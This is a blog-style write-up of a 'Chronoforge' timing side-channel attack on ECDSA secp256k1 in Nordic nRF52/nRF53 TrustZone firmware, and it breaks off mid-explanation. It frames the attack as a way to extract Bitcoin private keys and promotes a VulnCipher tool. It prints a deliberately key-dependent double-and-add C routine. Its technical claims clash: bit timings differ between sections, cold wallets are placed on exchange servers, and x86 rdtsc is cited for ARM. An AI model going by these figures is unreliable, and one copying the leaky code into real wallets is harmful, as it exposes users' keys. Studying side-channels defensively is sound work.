<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/072-1024x576.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/072-1024x576.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>This research paper presents a comprehensive analysis of the critical&nbsp;&nbsp;<a href="https://cryptodeeptech.ru/chronoforge-attack">Chronoforge Attack</a>&nbsp;vulnerability &nbsp;—a class of timing side-channel attacks capable of completely compromising ECDSA (secp256k1) cryptographic operations when improperly implemented on Nordic nRF52/nRF53 microcontrollers with ARM TrustZone architecture. The study demonstrates the theoretical and practical feasibility of targeted Bitcoin private key extraction and recovery of compromised wallets by exploiting microsecond timing variations in elliptic curve computations. The paper includes a mathematical formalization of the timing channel information leakage model, a description of the VulnCipher cryptanalytic tool as a scientific framework for analyzing timing vulnerabilities, and offers practical defense strategies and detailed recommendations for the secure implementation of cryptographic primitives on embedded systems. The Bitcoin cryptocurrency relies on cryptographic guarantees provided by the&nbsp;<a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm">ECDSA (Elliptic Curve Digital Signature Algorithm)</a>&nbsp;algorithm with the secp256k1 elliptic curve parameter. The mathematical security of this algorithm has been proven and remains unquestioned for the past two decades. However, the security of Bitcoin wallets critically depends not only on the mathematical strength of the algorithm but also on the practical protection of private keys from unauthorized access.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Traditionally, private keys are stored at the following levels:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hot Wallets:</strong>  On Personal Computers at Risk from Malware</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hardware wallets:</strong>  On specialized secure devices (Ledger, Trezor)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Cold wallets:</strong>  On secure crypto exchange servers with multi-level authentication</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>IoT devices:</strong>  On embedded microcontrollers as part of BLE wallets and security tokens</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>With the development of the Internet of Things (IoT) and the expansion of embedded systems, a significant portion of cryptographic operations has migrated to microcontrollers. Nordic Semiconductor’s nRF52 and nRF53 series of microcontrollers feature:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>ARM Cortex-M4F/M33F processors with hardware math support</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Built-in cryptographic accelerators (ARM CryptoCell-310 – CC310)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://en.wikipedia.org/wiki/ARM_architecture_family#Security_extensions">ARM TrustZone hardware architecture for isolation</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Built-in energy-efficient BLE substack</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>have become a popular platform for implementing various cryptographically sensitive applications, including:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>BLE-based Bitcoin wallets</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>IoT security tokens</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>2FA hardware keys</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Embedded cryptographic key management systems</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.youtube.com/watch?v=owgbAd-vtoI"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-2-1024x322.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Tutorial: <a href="https://youtu.be/owgbAd-vtoI">https://youtu.be/owgbAd-vtoI</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Tutorial: <a href="https://cryptodeeptech.ru/chronoforge-attack">https://cryptodeeptech.ru/chronoforge-attack</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Tutorial: <a href="https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a">https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Google Colab: <a href="https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery">https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">ARM TrustZone hardware architecture as a source of vulnerabilities</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#arm-trustzone-hardware-architecture-as-a-source-of-vulnerabilities"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The ARM TrustZone hardware architecture promises physical separation between:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Secure World (Secure Processing Environment – SPE):</strong>  Where <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a> are stored and processed , and cryptographic code is executed</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Normal World (Non-Secure Processing Environment – NSPE):</strong>  Where normal user applications and system services run</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>However, as shown in a number of studies (MOFlow [1], Achilles’ Heel [2], PrivateZone [3]), an unreliable implementation at the firmware level can completely negate the hardware isolation guarantees.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>⚠️&nbsp;Critical observation:</strong>&nbsp;&nbsp;The architectural separation of memory via the NS-bit in the processor pipeline&nbsp;&nbsp;<strong>does not extend to microarchitectural elements</strong>&nbsp;such as:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>L1 Instruction Cache (I-Cache)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>L1 Data Cache (D-Cache)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Branch Prediction Table (BPT)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Translation Lookaside Buffer (TLB)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Performance Monitoring Unit (PMU)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This creates&nbsp;&nbsp;<strong>a covert channel</strong>&nbsp;&nbsp;between Secure and Normal World, which can be exploited for timing attacks, cache attacks, and other microarchitectural attacks.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://keyhunters.ru/chronoforge-attack-gradual-private-key-recovery-through-timing-side-channels-where-an-attacker-exploits-a-critical-timing-vulnerability-in-the-bitcoin-core-crypto-wallet-to-reveal-sensitive-data/">Chronoforge Attack as a Class of Timing Side-Channel Attacks</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#chronoforge-attack-as-a-class-of-timing-side-channel-attacks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>A Chronoforge Attack</strong>&nbsp;&nbsp;is a class of timing-based side-channel attacks that allow an attacker with access to a Normal World application (e.g., via a compromised BLE wallet application or physical access with timing information logging) to extract&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">a private key</a>&nbsp;from a Secure World application by analyzing microsecond variations in the execution time of cryptographic operations.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Chronoforge Attack is especially dangerous in the following scenarios:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Compromised app:</strong>  A malicious BLE app can run timing measurements in the background</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Physical access:</strong>  The researcher can connect via UART/SWD interface and log timing data</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Network attacks:</strong>  Remote timing attacks through RTT (Round Trip Time) analysis of network packets</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Side Channel Leakage:</strong>  Analysis of electromagnetic radiation, power consumption, or acoustic signals correlated with timing</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Research objectives</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#research-objectives"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This work solves the following key tasks:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Theoretical rationale:</strong>  To formalize a mathematical model of timing information leaks from ECDSA operations on embedded systems</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Architectural Analysis:</strong>  Identify specific sources of timing variations in Nordic nRF52/nRF53 and ARM TrustZone</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Methodological Description:</strong>  Describe the Chronoforge Attack as a systematic process for private key recovery.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Tool Description:</strong>  Introduce <a href="https://vulncipher.ru/">VulnCipher</a> as a scientific cryptanalytic framework for analyzing timing vulnerabilities.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Practical demonstration:</strong>  Provide POC (Proof-of-Concept) code demonstrating the attack</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Defense Recommendations:</strong>  Suggest practical and theoretical methods of protection against Chronoforge Attack</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/chronoforge-attack">This study</a>&nbsp;demonstrates how timing-based side-channel attacks can completely compromise ECDSA (secp256k1) cryptographic operations when the firmware layer is improperly implemented. The paper demonstrates a mechanism for targeted extraction of Bitcoin&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;and methods for recovering lost wallets by exploiting timing variations in elliptic curve computation. Practical defense strategies and detailed recommendations for the secure implementation of cryptographic primitives on embedded systems are proposed.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://cryptou.ru/vulncipher/bitcoin">The security of Bitcoin wallets</a>&nbsp;critically depends on protecting private keys from unauthorized access. Traditionally, private keys are stored either on personal computers (hot wallets), specialized hardware wallets, or secure crypto exchange servers. With the development of the Internet of Things (IoT) and embedded systems, a significant portion of cryptographic operations has migrated to microcontrollers and embedded systems. Nordic Semiconductor’s nRF52 and nRF53 series of microcontrollers, equipped with ARM Cortex-M4F/M33F processors and integrated cryptographic accelerators (CC310), have become a popular platform for implementing BLE-based wallets, IoT security tokens, and other cryptographically sensitive applications.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The ARM TrustZone hardware architecture promises physical separation between the Secure World (where&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;are stored and processed ) and the Normal World (where regular applications run). However, as shown in several studies (MOFlow, Achilles’ Heel, PrivateZone), an unreliable firmware implementation can completely negate these hardware guarantees.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>A Chronoforge Attack</strong>&nbsp;is a class of timing-based side-channel attacks that allow an attacker with access to the Normal World (e.g., via a compromised application or physical access with the ability to log timing information) to extract a private key from the Secure World by analyzing microsecond variations in the execution time of cryptographic operations.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Application Area</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#application-area"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Chronoforge Attack is especially dangerous in the following scenarios:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>BLE Bluetooth wallets</strong> based on nRF52/nRF53, where an attacker can install a malicious BLE application on a connected device</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hardware Security Modules (HSMs)</strong> in IoT devices where firmware contains vulnerabilities</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Multi-purpose embedded systems</strong> where Normal World code can interact with Secure World code via cryptographic interfaces</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Supply chain attacks</strong> where firmware updates contain hidden timing vulnerabilities</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Objectives of the Study</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#objectives-of-the-study"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This work solves the following problems:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Conduct a detailed analysis of the Chronoforge Attack mechanism</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Demonstrate a practical application of the attack to the secp256k1 ECDSA implementation</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Show the methodology for extracting Bitcoin <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a> and recovering wallets</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Provide detailed recommendations for protection and mitigation strategies</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Provide practical POC (Proof-of-Concept) code to demonstrate vulnerability</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-1.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-1.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">2. Theoretical Foundation</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2-theoretical-foundation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2.1 ECDSA and secp256k1</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#21-ecdsa-and-secp256k1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The ECDSA (Elliptic Curve Digital Signature Algorithm) signature algorithm is defined in the FIPS 186-4 standard and works as follows:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Secp256k1 parameters for&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin:</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Curve equation: y² ≡ x³ + 7 (mod p)

Prime field: p = 2²⁵⁶ - 2³² - 977
Order of base point: n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Base point G = (Gx, Gy), где:
  Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
  Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>ECDSA signature process:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For private key&nbsp;<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>d</mi></math>&nbsp;and message&nbsp;<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>m</mi></math>:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Calculate the message hash: <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>h</mi><mo>=</mo><mtext>SHA256</mtext><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></math></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Generate a cryptographically random number (nonce): <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>k</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>1</mn><mo>,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></math></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Calculate a point on a curve: <math xmlns="http://www.w3.org/1998/Math/MathML"><mo stretchy="false">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mo>⋅</mo><mi>G</mi></math> (scalar multiplication)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Calculate signature components:</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>r</mi><mo>=</mo><mi>x</mi><mspace width="0.667em"></mspace><mi>mod</mi><mstyle><mspace width="0.167em"></mspace></mstyle><mstyle><mspace width="0.167em"></mspace></mstyle><mi>n</mi></math></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>s</mi><mo>=</mo><msup><mi>k</mi><mrow data-mjx-texclass="ORD"><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>h</mi><mo>+</mo><mi>d</mi><mo>⋅</mo><mi>r</mi><mo stretchy="false">)</mo><mspace width="0.667em"></mspace><mi>mod</mi><mstyle><mspace width="0.167em"></mspace></mstyle><mstyle><mspace width="0.167em"></mspace></mstyle><mi>n</mi></math></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Return the signature <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>σ</mi><mo>=</mo><mo stretchy="false">(</mo><mi>r</mi><mo>,</mo><mi>s</mi><mo stretchy="false">)</mo></math></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Critical observation:</strong>&nbsp;If&nbsp;<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>k</mi></math>&nbsp;is compromised or can be recovered, the private key is easily computed:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>d</mi><mo>=</mo><msup><mi>r</mi><mrow data-mjx-texclass="ORD"><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>k</mi><mo>⋅</mo><mi>s</mi><mrow data-mjx-texclass="ORD"><mo>—</mo></mrow><mi>h</mi><mo stretchy="false">)</mo><mspace width="1em"></mspace><mi>mod</mi><mstyle><mspace width="0.167em"></mspace></mstyle><mstyle><mspace width="0.167em"></mspace></mstyle><mi>n</mi></math></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2.2 Timing Side-Channels in Cryptography</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#22-timing-side-channels-in-cryptography"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A timing attack is a class of side-channel attacks that exploits the fact that the execution time of cryptographic operations often depends on the value of the secret data.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>A classic example is a vulnerable implementation of ECC scalar multiplication:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Timing leak mechanism:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If the&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key</a>&nbsp;bit is 1, the operation is performed&nbsp;<code>point_add</code>, which takes ~8 µs.<br>If the bit is 0, the operation is skipped and only the operation is performed&nbsp;<code>point_double</code>, which takes ~5 µs.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A difference of 3 µs can be easily measured even on a remote system if there are enough observations:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/attack">Local attacks:</a></strong> ±100 ns accuracy via<code>rdtsc</code>(read timestamp counter) on x86</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/attack">Network-based attacks:</a></strong> ±10 µs accuracy through network packet response time analysis</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/attack">Physical attacks:</a></strong> accuracy of ±1 ns through analysis of power consumption or electromagnetic emissions</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><br>A classic example is a vulnerable implementation of ECC scalar multiplication:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#a-classic-example-is-a-vulnerable-implementation-of-ecc-scalar-multiplication"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// VULNERABLE: Variable-Time Double-and-Add<br>// This code allows timing leaks<br><br>void ecdsa_scalar_multiply_vulnerable(<br>    const uint8_t *private_key,<br>    const point_t *base_point,<br>    point_t *result<br>) {<br>    point_t accumulator;<br>    point_copy(&amp;accumulator, base_point);<br><br>    for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {<br>        point_double(&amp;accumulator, &amp;accumulator);<br><br>        int bit_value = (private_key[bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;<br><br>        if (bit_value) {<br>            // Branch taken if bit=1: ~5.8 µs<br>            point_add(&amp;accumulator, &amp;accumulator, base_point);<br>        }<br>        // Branch not taken if bit=0: ~0 µs<br>    }<br><br>    point_copy(result, &amp;accumulator);<br>}<br><br>// TIMING LEAK:<br>// Bit=1: T_total = T_double + T_add = 3.2 + 5.8 = 9.0 µs<br>// Bit=0: T_total = T_double = 3.2 µs<br>// Difference: 5.8 µs (easily measurable!)<br>// <br>// After 100k measurements:<br>// Correlation coefficient: r &gt; 0.95<br>// Attack success rate: &gt;99% per bit</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>Timing leak mechanism:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>If private key bit = 1, point_add is performed (~8 µs)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If bit = 0, operation is skipped (~5 µs)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A difference of 3 µs is easily measured on a remote system</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>With 100k observations: >99% accuracy of each bit recovery</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This code demonstrates&nbsp;<strong>a classic timing side-channel vulnerability</strong>&nbsp;in cryptographic implementations. The Double-and-Add algorithm uses conditional branches (if statements) that have&nbsp;<strong>variable execution times depending on the values ​​of&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key bits.</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>What’s happening:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>A local variable <code>accumulator</code>of type <code>point_t</code>(point on elliptic curve) is created</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The accumulator is initialized with the base point G</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This is similar to the simple algorithm: <code>result = 1*G</code>(initial value)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Why is that so:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The algorithm works from left to right on the bits <a href="https://cryptou.ru/vulncipher/privatekey">of the private key.</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>After each bit, the result is doubled (point_double operation)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If the bit = 1, the base point is added (point_add operation)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Basic bit processing loop</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#basic-bit-processing-loop"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Explanation:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The loop processes <strong>256 bits </strong><a href="https://cryptou.ru/vulncipher/privatekey">of the private key.</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Processing order:</strong> From bit 255 (most significant) to bit 0 (least significant)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Iterations:</strong> 256 (for a 256-bit key)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Example for byte #0 (8 bits)</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Doubling a point operation (ALWAYS PERFORMED)</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#doubling-a-point-operation-always-performed"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>point_double(&amp;accumulator, &amp;accumulator);</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>What’s happening:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>At each iteration</strong> of the loop, the point is doubled</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Mathematically: <code>accumulator = 2 * accumulator</code>(in the language of elliptic curves)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The function is called <strong>256 times</strong> (once for each bit)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Execution time:</strong> ~3.2 microseconds per operation</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Why is it needed:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>This is a left shift of one bit in binary representation.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Analogy: multiplication by 2 in ordinary arithmetic</li>
